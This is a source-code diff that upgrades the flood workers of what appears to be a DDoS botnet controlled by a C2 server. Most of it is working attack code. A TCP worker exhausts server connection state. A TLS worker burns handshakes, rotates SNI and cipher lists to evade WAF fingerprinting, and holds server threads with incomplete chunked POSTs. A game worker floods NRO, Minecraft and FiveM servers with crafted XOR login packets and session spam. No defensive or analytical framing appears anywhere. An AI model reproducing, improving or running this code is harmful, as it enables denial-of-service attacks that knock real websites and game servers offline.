+                tcp_set_linger_rst(fd); /* RST on close — burns more server state */
+                close(fd);
+            }
         }
 
-        /* Phase B: hold — poke held sockets so they stay ESTABLISHED.
-         * Even if server sends RST, the connection burned accept/backlog slot. */
+        /* Poke held connections with random intervals */
         for (int i = 0; i < pool && !is_attack_stop(); i++) {
             if (cpool[i] < 0) continue;
-            char z = (char)(rs(&seed) & 0xFF);
-            if (send(cpool[i], &z, 1, MSG_NOSIGNAL) <= 0) { close(cpool[i]); cpool[i] = -1; }
-            else pkt_sent(1);
+            char z[16];
+            int zl = 1 + (int)(rs(&seed) % 8);
+            for (int j = 0; j < zl; j++) z[j] = (char)(rs(&seed) & 0xFF);
+            if (send(cpool[i], z, zl, MSG_NOSIGNAL) <= 0) {
+                close(cpool[i]); cpool[i] = -1;
+            } else pkt_sent(zl);
         }
 
-        /* Compact: drop dead, keep live */
+        /* Occasionally cull 20% of pool with RST to free FDs + re-storm */
+        if (pool > TCP_CONN_POOL / 2 && phase == 0) {
+            for (int i = 0; i < pool; i++) {
+                if (cpool[i] >= 0 && (rs(&seed) % 5) == 0) {
+                    tcp_set_linger_rst(cpool[i]);
+                    close(cpool[i]);
+                    cpool[i] = -1;
+                }
+            }
+        }
+
         int w = 0;
         for (int i = 0; i < pool; i++) {
             if (cpool[i] < 0) continue;
-            struct pollfd pfd = { .fd = cpool[i], .events = POLLERR|POLLHUP };
-            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR|POLLHUP))) close(cpool[i]);
-            else cpool[w++] = cpool[i];
+            struct pollfd pfd = { .fd = cpool[i], .events = POLLERR | POLLHUP };
+            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP)))
+                close(cpool[i]);
+            else
+                cpool[w++] = cpool[i];
         }
         pool = w;
         sched_yield();
@@ -447,17 +757,17 @@ static void *tcp_worker(void *arg) {
 }
 
 /* ════════════════════════════════════════════════════════════════════════
- *  METHOD 3 — TLS  (TLS handshake exhaust + keep-alive GET)
+ *  METHOD 3 — TLS v3  (handshake burn + slow GET + fingerprint rotate)
  *
- *  Bypass anti-DDoS:
- *    • Full TLS handshake per connection → CPU cost on server (TLS is costly)
- *    • Keep connections alive with periodic GET → bypass idle-timeout cleanup
- *    • SNI rotation (use target host + random subdomains)
- *    • Session reuse disabled → forces full handshake every time
- *    • Randomized ciphers / ALPN to dodge WAF TLS fingerprinting
+ *  Against small/mid WAF:
+ *    • Rotate SNI (www/cdn/api/empty) + cipher suites (JA3 variance)
+ *    • Mix full-handshake-then-close with long-lived keep-alive
+ *    • Slow request rate on held conns (not 24 GETs/loop → less WAF trip)
+ *    • POST / chunked incomplete bodies (hold worker threads)
+ *    • Optional raw TCP fallback if TLS fails (still burns accept)
  * ════════════════════════════════════════════════════════════════════════ */
-#define TLS_POOL   1024
-#define TLS_BURST  24
+#define TLS_POOL   1536
+#define TLS_STORM  48
 
 static void *tls_worker(void *arg) {
     AttackThread *mt = (AttackThread *)arg;
@@ -469,13 +779,16 @@ static void *tls_worker(void *arg) {
     if (!ctx) return NULL;
     SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
     SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
-    SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);   /* avoid BEAST-side leak */
-    /* disable session reuse → every connection = full handshake */
+    SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);
     SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_OFF);
 
     int *socks = calloc(TLS_POOL, sizeof(int));
     SSL **ssls = calloc(TLS_POOL, sizeof(SSL *));
-    if (!socks || !ssls) { free(socks); free(ssls); SSL_CTX_free(ctx); return NULL; }
+    time_t *last_req = calloc(TLS_POOL, sizeof(time_t));
+    if (!socks || !ssls || !last_req) {
+        free(socks); free(ssls); free(last_req); SSL_CTX_free(ctx);
+        return NULL;
+    }
 
     struct sockaddr_in ta = mt->target;
     int base_port = mt->port_base > 0 ? mt->port_base : 443;
@@ -485,74 +798,133 @@ static void *tls_worker(void *arg) {
     unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
     time_t start = time(NULL);
 
-    fprintf(stderr, "[atk] TLS → %s:%d (handshake+keepalive)\n", host, base_port);
+    static const char *sni_pool[] = {
+        NULL, /* filled with host */
+        "www.", "cdn.", "api.", "static.", "m.", "img.",
+    };
+
+    if (mt->worker_id == 0)
+        fprintf(stderr, "[atk] TLS v3 → %s:%d (HS burn + slow GET + SNI rotate)\n", host, base_port);
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
 
-        /* Phase A: open + TLS handshake new connections */
-        for (int n = 0; n < 64 && pool < TLS_POOL && !is_attack_stop(); n++) {
+        int mode = (int)((time(NULL) - start) / 4) % 3; /* 0=HS churn 1=hold 2=mix */
+
+        for (int n = 0; n < TLS_STORM && !is_attack_stop(); n++) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) break;
             int one = 1;
             setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
             setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
-            struct timeval tv = {5,0};
+            struct timeval tv = {4, 0};
             setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
             setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-            if (tcp_connect_wait(s, &ta, 1000) < 0) { close(s); continue; }
+            if ((rs(&seed) & 7) == 0) usleep((rs(&seed) % 2000) + 1);
+            if (tcp_connect_wait(s, &ta, 900) < 0) { close(s); continue; }
 
             SSL *ssl = SSL_new(ctx);
             if (!ssl) { close(s); continue; }
             SSL_set_fd(ssl, s);
-            SSL_set_tlsext_host_name(ssl, host);
-            /* randomize cipher list to dodge JA3 fingerprint */
+
+            /* SNI rotation */
+            char sni[288];
+            int si = (int)(rs(&seed) % 7);
+            if (si == 0) {
+                strncpy(sni, host, sizeof(sni) - 1);
+            } else {
+                snprintf(sni, sizeof(sni), "%s%s", sni_pool[si], host);
+            }
+            SSL_set_tlsext_host_name(ssl, sni);
+
             const char *ciphers[] = {
                 "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
                 "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
                 "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
                 "AES256-GCM-SHA384:AES128-GCM-SHA256",
+                "ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256",
             };
-            SSL_set_cipher_list(ssl, ciphers[rs(&seed) % 4]);
+            SSL_set_cipher_list(ssl, ciphers[rs(&seed) % 5]);
 
-            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }
-            socks[pool] = s; ssls[pool] = ssl; pool++;
-            pkt_sent(1024);   /* handshake ≈ 1KB on the wire */
-        }
+            if (SSL_connect(ssl) != 1) {
+                /* still burned TCP accept + partial TLS on server */
+                SSL_free(ssl);
+                close(s);
+                pkt_sent(200);
+                continue;
+            }
+            pkt_sent(1200);
 
-        /* Phase B: keep-alive GET burst on each live connection */
-        for (int i = 0; i < pool && !is_attack_stop(); i++) {
-            if (socks[i] < 0 || !ssls[i]) continue;
-            for (int b = 0; b < TLS_BURST && !is_attack_stop(); b++) {
-                char req[512];
-                const char *ua = UA_POOL[rs(&seed) % UA_COUNT];
-                const char *path = PATH_POOL[rs(&seed) % PATH_COUNT];
+            int hold = (mode == 1) || (mode == 2 && (rs(&seed) & 1)) || (mode == 0 && (rs(&seed) % 10) < 2);
+            if (hold && pool < TLS_POOL) {
+                socks[pool] = s;
+                ssls[pool] = ssl;
+                last_req[pool] = 0;
+                pool++;
+            } else {
+                /* one POST then drop — handshake already paid */
+                char req[384];
                 int rl = snprintf(req, sizeof(req),
-                    "GET %s?r=%u HTTP/1.1\r\nHost: %s\r\n"
-                    "User-Agent: %s\r\nAccept: */*\r\n"
-                    "Connection: keep-alive\r\n\r\n",
-                    path, rs(&seed), host, ua);
-                int wr = SSL_write(ssls[i], req, rl);
-                if (wr <= 0) {
-                    SSL_free(ssls[i]); ssls[i] = NULL;
-                    close(socks[i]); socks[i] = -1;
-                    break;
-                }
-                pkt_sent(wr);
+                    "POST /%x HTTP/1.1\r\nHost: %s\r\n"
+                    "User-Agent: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
+                    rs(&seed) & 0xFFFF, host, UA_POOL[rs(&seed) % UA_COUNT]);
+                SSL_write(ssl, req, rl);
+                pkt_sent(rl);
+                SSL_free(ssl);
+                close(s);
             }
         }
 
-        /* Compact: drop dead */
+        /* Slow traffic on held conns — 1 req every 2–8s, not burst */
+        time_t now = time(NULL);
+        for (int i = 0; i < pool && !is_attack_stop(); i++) {
+            if (socks[i] < 0 || !ssls[i]) continue;
+            int interval = 2 + (int)(rs(&seed) % 7);
+            if (last_req[i] && now - last_req[i] < interval) continue;
+
+            char req[640];
+            int rl;
+            if ((rs(&seed) & 3) == 0) {
+                /* incomplete chunked POST — holds server parser */
+                rl = snprintf(req, sizeof(req),
+                    "POST %s HTTP/1.1\r\nHost: %s\r\n"
+                    "User-Agent: %s\r\nTransfer-Encoding: chunked\r\n"
+                    "Connection: keep-alive\r\n\r\n%x\r\n",
+                    PATH_POOL[rs(&seed) % PATH_COUNT], host,
+                    UA_POOL[rs(&seed) % UA_COUNT], 16 + (rs(&seed) % 48));
+            } else {
+                rl = snprintf(req, sizeof(req),
+                    "GET %s?r=%u HTTP/1.1\r\nHost: %s\r\n"
+                    "User-Agent: %s\r\nAccept: */*\r\n"
+                    "Accept-Language: en-US,en;q=0.%u\r\n"
+                    "Cache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n",
+                    PATH_POOL[rs(&seed) % PATH_COUNT], rs(&seed), host,
+                    UA_POOL[rs(&seed) % UA_COUNT], 1 + (rs(&seed) % 9));
+            }
+            int wr = SSL_write(ssls[i], req, rl);
+            if (wr <= 0) {
+                SSL_free(ssls[i]); ssls[i] = NULL;
+                close(socks[i]); socks[i] = -1;
+            } else {
+                pkt_sent(wr);
+                last_req[i] = now;
+            }
+        }
+
         int w = 0;
         for (int i = 0; i < pool; i++) {
             if (socks[i] < 0) continue;
-            struct pollfd pfd = { .fd = socks[i], .events = POLLERR|POLLHUP };
-            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR|POLLHUP))) {
+            struct pollfd pfd = { .fd = socks[i], .events = POLLERR | POLLHUP };
+            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP))) {
                 if (ssls[i]) SSL_free(ssls[i]);
                 close(socks[i]);
             } else {
-                if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; }
+                if (w != i) {
+                    socks[w] = socks[i];
+                    ssls[w] = ssls[i];
+                    last_req[w] = last_req[i];
+                }
                 w++;
             }
         }
@@ -560,9 +932,12 @@ static void *tls_worker(void *arg) {
         sched_yield();
     }
 
-    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); if (socks[i] >= 0) close(socks[i]); }
+    for (int i = 0; i < pool; i++) {
+        if (ssls[i]) SSL_free(ssls[i]);
+        if (socks[i] >= 0) close(socks[i]);
+    }
     SSL_CTX_free(ctx);
-    free(socks); free(ssls);
+    free(socks); free(ssls); free(last_req);
     return NULL;
 }
 
@@ -700,18 +1075,96 @@ static void *http_worker(void *arg) {
 }
 
 /* ════════════════════════════════════════════════════════════════════════
- *  METHOD 5 — GAME  (socket protocol exploit — NRO-style login spam)
+ *  METHOD 5 — GAME v2  (socket protocol exploit — multi-game + NRO depth)
  *
- *  Bypass / upgrade over the old game_worker:
- *    • XOR key rotation across multiple candidate keys (not just "boys")
- *    • Connection pool with keep-alive drip (login spam every few seconds)
- *    • Randomized username per packet → defeat auth-cache blacklisting
- *    • Uses server-provided payload if available, else crafts NRO login pkt
- *    • Multi-packet: handshake → login → session spam → keep poke
+ *  Upgrades:
+ *    • Multi-port from C2 open_ports (14443/25565/30120/7777/…)
+ *    • Per-port game family: NRO | Minecraft | FiveM | generic
+ *    • Storm open + hold pool + session spam (not just login once)
+ *    • XOR key rotation + fresh username every login
+ *    • Server payload_b64 still preferred when provided
  * ════════════════════════════════════════════════════════════════════════ */
-#define GAME_POOL 512
-static const char *GAME_KEYS[] = { "boys", "botn", "khoi", "game" };
+#define GAME_POOL   1024
+#define GAME_STORM  32
+static const char *GAME_KEYS[] = { "boys", "botn", "khoi", "game", "nro1", "dark" };
 #define GAME_KEY_COUNT (int)(sizeof(GAME_KEYS)/sizeof(GAME_KEYS[0]))
+
+enum { G_NRO=0, G_MC, G_FIVEM, G_GENERIC };
+
+static int game_family(int port) {
+    if (port == 14443 || port == 14444) return G_NRO;
+    if (port == 25565 || port == 25566) return G_MC;
+    if (port == 30120 || port == 30110) return G_FIVEM;
+    if (port == 7777 || port == 27015) return G_GENERIC;
+    return G_NRO; /* default NRO-style for unknown game ports */
+}
+
+/* Craft NRO login (XOR key) into out, return len */
+static int game_craft_nro_login(unsigned char *out, int cap, const char *key, unsigned int *seed) {
+    if (cap < 64) return 0;
+    int klen = (int)strlen(key);
+    if (klen <= 0) return 0;
+    unsigned char data[128];
+    int dlen = 0;
+    char user[32], pass[16];
+    snprintf(user, sizeof(user), "bot%u", rs(seed) % 9999999u);
+    snprintf(pass, sizeof(pass), "p%u", rs(seed) % 99999u);
+    int ulen = (int)strlen(user), plen = (int)strlen(pass);
+    data[dlen++] = (unsigned char)(ulen >> 8);
+    data[dlen++] = (unsigned char)(ulen & 0xFF);
+    memcpy(data + dlen, user, (size_t)ulen); dlen += ulen;
+    data[dlen++] = (unsigned char)(plen >> 8);
+    data[dlen++] = (unsigned char)(plen & 0xFF);
+    memcpy(data + dlen, pass, (size_t)plen); dlen += plen;
+    const char *ver = "2.4.0"; int vlen = (int)strlen(ver);
+    data[dlen++] = (unsigned char)(vlen >> 8);
+    data[dlen++] = (unsigned char)(vlen & 0xFF);
+    memcpy(data + dlen, ver, (size_t)vlen); dlen += vlen;
+    data[dlen++] = 0; /* type login */
+    unsigned char xdata[128];
+    for (int i = 0; i < dlen; i++) xdata[i] = data[i] ^ (unsigned char)key[i % klen];
+    int o = 0;
+    out[o++] = 0 ^ (unsigned char)key[0];
+    out[o++] = (unsigned char)((dlen >> 8) & 0xFF) ^ (unsigned char)key[1 % klen];
+    out[o++] = (unsigned char)(dlen & 0xFF) ^ (unsigned char)key[2 % klen];
+    if (o + dlen > cap) return 0;
+    memcpy(out + o, xdata, (size_t)dlen); o += dlen;
+    return o;
+}
+
+static int game_nro_handshake(unsigned char *out, int cap, const char *key) {
+    int klen = (int)strlen(key);
+    if (cap < 20 || klen <= 0 || klen > 8) return 0;
+    int o = 0;
+    out[o++] = 0xE5;
+    out[o++] = 0x00;
+    out[o++] = (unsigned char)(1 + klen + 2 + 4 + 1); /* rough size */
+    out[o++] = (unsigned char)klen;
+    for (int i = 0; i < klen; i++) out[o++] = (unsigned char)key[i];
+    out[o++] = 0; out[o++] = 0;
+    out[o++] = 0; out[o++] = 0; out[o++] = 0; out[o++] = 0;
+    out[o++] = 0;
+    return o;
+}
+
+/* Minecraft legacy ping / handshake-ish (status request) — no full MC protocol */
+static int game_mc_handshake(unsigned char *out, int cap, const char *host, int port, unsigned int *seed) {
+    if (cap < 128) return 0;
+    /* Simplified: send legacy server list ping 0xFE 0x01 */
+    (void)host; (void)port; (void)seed;
+    out[0] = 0xFE; out[1] = 0x01;
+    return 2;
+}
+
+/* FiveM / CFX getinfo style UDP is common; TCP: send getinfo-like HTTP */
+static int game_fivem_probe(unsigned char *out, int cap) {
+    const char *req =
+        "GET /info.json HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n";
+    int n = (int)strlen(req);
+    if (n > cap) return 0;
+    memcpy(out, req, (size_t)n);
+    return n;
+}
 
 static void *game_worker(void *arg) {
     AttackThread *mt = (AttackThread *)arg;
@@ -719,116 +1172,166 @@ static void *game_worker(void *arg) {
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    struct sockaddr_in ta = mt->target;
-    int base_port = mt->port_base > 0 ? mt->port_base : 14443;
-    ta.sin_port = htons((uint16_t)base_port);
-
     unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
     time_t start = time(NULL);
 
-    /* Pre-craft a login packet per XOR key */
-    unsigned char pkts[GAME_KEY_COUNT][256];
-    int pkt_lens[GAME_KEY_COUNT];
-    for (int k = 0; k < GAME_KEY_COUNT; k++) {
-        if (g_game_payload_len > 0) {
-            int n = g_game_payload_len < 256 ? g_game_payload_len : 256;
-            memcpy(pkts[k], g_game_payload, n);
-            pkt_lens[k] = n;
-            continue;
+    /* Port set: open_ports CSV or single port_base */
+    int ports[32];
+    int nports = 0;
+    if (mt->open_ports[0]) {
+        const char *p = mt->open_ports;
+        while (*p && nports < 32) {
+            while (*p == ' ' || *p == ',') p++;
+            int v = 0;
+            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
+            if (v > 0 && v < 65536) {
+                int dup = 0;
+                for (int i = 0; i < nports; i++) if (ports[i] == v) dup = 1;
+                if (!dup) ports[nports++] = v;
+            }
+            while (*p && *p != ',') p++;
+            if (*p == ',') p++;
         }
-        const char *key = GAME_KEYS[k];
-        int klen = (int)strlen(key);
-        unsigned char data[128];
-        int dlen = 0;
-        char user[32];
-        snprintf(user, sizeof(user), "bot%d", rs(&seed) % 999999);
-        int ulen = (int)strlen(user);
-        data[dlen++] = (unsigned char)(ulen >> 8);
-        data[dlen++] = (unsigned char)(ulen & 0xFF);
-        memcpy(data + dlen, user, ulen); dlen += ulen;
-        data[dlen++] = 0; data[dlen++] = 1; data[dlen++] = 'x';
-        const char *ver = "2.1.3"; int vlen = (int)strlen(ver);
-        data[dlen++] = (unsigned char)(vlen >> 8);
-        data[dlen++] = (unsigned char)(vlen & 0xFF);
-        memcpy(data + dlen, ver, vlen); dlen += vlen;
-        data[dlen++] = 0;
-        unsigned char xdata[128];
-        for (int i = 0; i < dlen; i++) xdata[i] = data[i] ^ (unsigned char)key[i % klen];
-        int plen = 0;
-        pkts[k][plen++] = 0 ^ (unsigned char)key[0];
-        pkts[k][plen++] = (unsigned char)((dlen >> 8) & 0xFF) ^ (unsigned char)key[1 % klen];
-        pkts[k][plen++] = (unsigned char)(dlen & 0xFF) ^ (unsigned char)key[2 % klen];
-        memcpy(pkts[k] + plen, xdata, dlen); plen += dlen;
-        pkt_lens[k] = plen;
+    }
+    if (nports == 0) {
+        ports[0] = mt->port_base > 0 ? mt->port_base : 14443;
+        nports = 1;
     }
 
-    int socks[GAME_POOL];
+    int *socks = calloc(GAME_POOL, sizeof(int));
+    int *sport = calloc(GAME_POOL, sizeof(int));
     time_t *last_drip = calloc(GAME_POOL, sizeof(time_t));
+    if (!socks || !sport || !last_drip) {
+        free(socks); free(sport); free(last_drip);
+        return NULL;
+    }
     int pool = 0;
-    if (!last_drip) return NULL;
+
+    if (mt->worker_id == 0) {
+        fprintf(stderr, "[atk] GAME v2: %d port(s) on %s", nports, mt->host);
+        for (int i = 0; i < nports && i < 8; i++)
+            fprintf(stderr, " %d", ports[i]);
+        fprintf(stderr, "\n");
+    }
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
 
-        /* Fill pool: handshake + login */
-        while (pool < GAME_POOL && !is_attack_stop()) {
+        /* Storm fill */
+        for (int n = 0; n < GAME_STORM && pool < GAME_POOL && !is_attack_stop(); n++) {
+            int port = ports[rs(&seed) % (unsigned)nports];
+            int fam = game_family(port);
+            struct sockaddr_in ta = mt->target;
+            ta.sin_port = htons((uint16_t)port);
+
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) break;
             int one = 1;
             setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
             setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
-            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }
+            struct timeval tv = {3, 0};
+            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            if (tcp_connect_wait(s, &ta, 1200) < 0) { close(s); continue; }
 
-            /* handshake: cmd=-27, size=6, keylen, key, empty utf, int0, byte0 */
-            int k = rs(&seed) % GAME_KEY_COUNT;
-            const char *key = GAME_KEYS[k];
-            int klen = (int)strlen(key);
-            unsigned char hs[32];
-            int hl = 0;
-            hs[hl++] = 0xE5;            /* cmd = -27 */
-            hs[hl++] = 0x00; hs[hl++] = 0x06;
-            hs[hl++] = (unsigned char)klen;
-            for (int i = 0; i < klen && hl < 30; i++) hs[hl++] = (unsigned char)key[i];
-            hs[hl++] = 0x00; hs[hl++] = 0x00;
-            hs[hl++] = 0x00; hs[hl++] = 0x00; hs[hl++] = 0x00; hs[hl++] = 0x00;
-            hs[hl++] = 0x00;
-            send(s, hs, hl, MSG_NOSIGNAL);
-            /* login packet (XOR'd) */
-            send(s, pkts[k], pkt_lens[k], MSG_NOSIGNAL);
+            unsigned char pkt[320];
+            int plen = 0;
 
-            socks[pool] = s; last_drip[pool] = time(NULL); pool++;
-            pkt_sent(hl + pkt_lens[k]);
+            if (g_game_payload_len > 0) {
+                plen = g_game_payload_len < 300 ? g_game_payload_len : 300;
+                memcpy(pkt, g_game_payload, (size_t)plen);
+                send(s, pkt, plen, MSG_NOSIGNAL);
+                pkt_sent(plen);
+            } else if (fam == G_NRO) {
+                int k = (int)(rs(&seed) % (unsigned)GAME_KEY_COUNT);
+                const char *key = GAME_KEYS[k];
+                int hl = game_nro_handshake(pkt, (int)sizeof(pkt), key);
+                if (hl > 0) { send(s, pkt, hl, MSG_NOSIGNAL); pkt_sent(hl); }
+                plen = game_craft_nro_login(pkt, (int)sizeof(pkt), key, &seed);
+                if (plen > 0) {
+                    send(s, pkt, plen, MSG_NOSIGNAL);
+                    pkt_sent(plen);
+                    /* session spam: extra login variants */
+                    for (int r = 0; r < 3; r++) {
+                        plen = game_craft_nro_login(pkt, (int)sizeof(pkt),
+                            GAME_KEYS[rs(&seed) % GAME_KEY_COUNT], &seed);
+                        if (plen > 0) {
+                            send(s, pkt, plen, MSG_NOSIGNAL);
+                            pkt_sent(plen);
+                        }
+                    }
+                }
+            } else if (fam == G_MC) {
+                plen = game_mc_handshake(pkt, (int)sizeof(pkt), mt->host, port, &seed);
+                if (plen > 0) { send(s, pkt, plen, MSG_NOSIGNAL); pkt_sent(plen); }
+            } else if (fam == G_FIVEM) {
+                plen = game_fivem_probe(pkt, (int)sizeof(pkt));
+                if (plen > 0) { send(s, pkt, plen, MSG_NOSIGNAL); pkt_sent(plen); }
+            } else {
+                /* generic: random binary burst */
+                plen = 32 + (int)(rs(&seed) % 64);
+                for (int i = 0; i < plen; i++) pkt[i] = (unsigned char)(rs(&seed) & 0xFF);
+                send(s, pkt, plen, MSG_NOSIGNAL);
+                pkt_sent(plen);
+            }
+
+            /* 70% hold for session spam, 30% churn */
+            if ((rs(&seed) % 10) < 7 && pool < GAME_POOL) {
+                socks[pool] = s;
+                sport[pool] = port;
+                last_drip[pool] = time(NULL);
+                pool++;
+            } else {
+                close(s);
+            }
         }
 
-        /* Drip: resend login packets periodically to keep server busy */
+        /* Drip / session spam on held conns */
         time_t now = time(NULL);
         for (int i = 0; i < pool && !is_attack_stop(); i++) {
-            int interval = 3 + (int)(rs(&seed) % 8);
-            if (now - last_drip[i] >= interval) {
-                int k = rs(&seed) % GAME_KEY_COUNT;
-                if (send(socks[i], pkts[k], pkt_lens[k], MSG_NOSIGNAL) > 0)
-                    pkt_sent(pkt_lens[k]);
-                last_drip[i] = now;
+            if (socks[i] < 0) continue;
+            int interval = 1 + (int)(rs(&seed) % 4);
+            if (now - last_drip[i] < interval) continue;
+            int fam = game_family(sport[i]);
+            unsigned char pkt[320];
+            int plen = 0;
+            int wr = -1;
+            if (g_game_payload_len > 0) {
+                plen = g_game_payload_len < 300 ? g_game_payload_len : 300;
+                wr = (int)send(socks[i], g_game_payload, plen, MSG_NOSIGNAL);
+            } else if (fam == G_NRO) {
+                plen = game_craft_nro_login(pkt, (int)sizeof(pkt),
+                    GAME_KEYS[rs(&seed) % GAME_KEY_COUNT], &seed);
+                wr = plen > 0 ? (int)send(socks[i], pkt, plen, MSG_NOSIGNAL) : -1;
+            } else if (fam == G_FIVEM) {
+                plen = game_fivem_probe(pkt, (int)sizeof(pkt));
+                wr = plen > 0 ? (int)send(socks[i], pkt, plen, MSG_NOSIGNAL) : -1;
+            } else {
+                char z = (char)(rs(&seed) & 0xFF);
+                wr = (int)send(socks[i], &z, 1, MSG_NOSIGNAL);
             }
+            if (wr <= 0) { close(socks[i]); socks[i] = -1; }
+            else { pkt_sent(wr); last_drip[i] = now; }
         }
 
-        /* Reap dead */
-        struct pollfd pfds[GAME_POOL];
-        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR|POLLHUP; }
-        if (poll(pfds, (nfds_t)pool, 200) > 0) {
-            int w = 0;
-            for (int i = 0; i < pool; i++) {
-                if (pfds[i].revents & (POLLERR|POLLHUP)) close(socks[i]);
-                else { if (w != i) { socks[w]=socks[i]; last_drip[w]=last_drip[i]; } w++; }
+        /* Compact */
+        int w = 0;
+        for (int i = 0; i < pool; i++) {
+            if (socks[i] < 0) continue;
+            struct pollfd pfd = { .fd = socks[i], .events = POLLERR | POLLHUP };
+            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP)))
+                close(socks[i]);
+            else {
+                if (w != i) { socks[w] = socks[i]; sport[w] = sport[i]; last_drip[w] = last_drip[i]; }
+                w++;
             }
-            pool = w;
         }
+        pool = w;
         sched_yield();
     }
 
-    for (int i = 0; i < pool; i++) close(socks[i]);
-    free(last_drip);
+    for (int i = 0; i < pool; i++) if (socks[i] >= 0) close(socks[i]);
+    free(socks); free(sport); free(last_drip);
     return NULL;
 }
 
@@ -875,7 +1378,7 @@ void *bg_attack_thread(void *arg) {
             nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
     }
 
-    /* Resolve method tag — 5 methods only: PSPE | TCP | TLS | HTTP | GAME */
+    /* Methods: PSPE | TCP | TLS | HTTP | GAME */
     int tag = 0;
     const char *label = "PSPE";
     if (atk->mega_mode || !strcmp(nm, "PSPE") || !strcmp(nm, "MEGA") || !strcmp(nm, "UDP") || !strcmp(nm, "PORT") || !strcmp(nm, "SCAN")) {
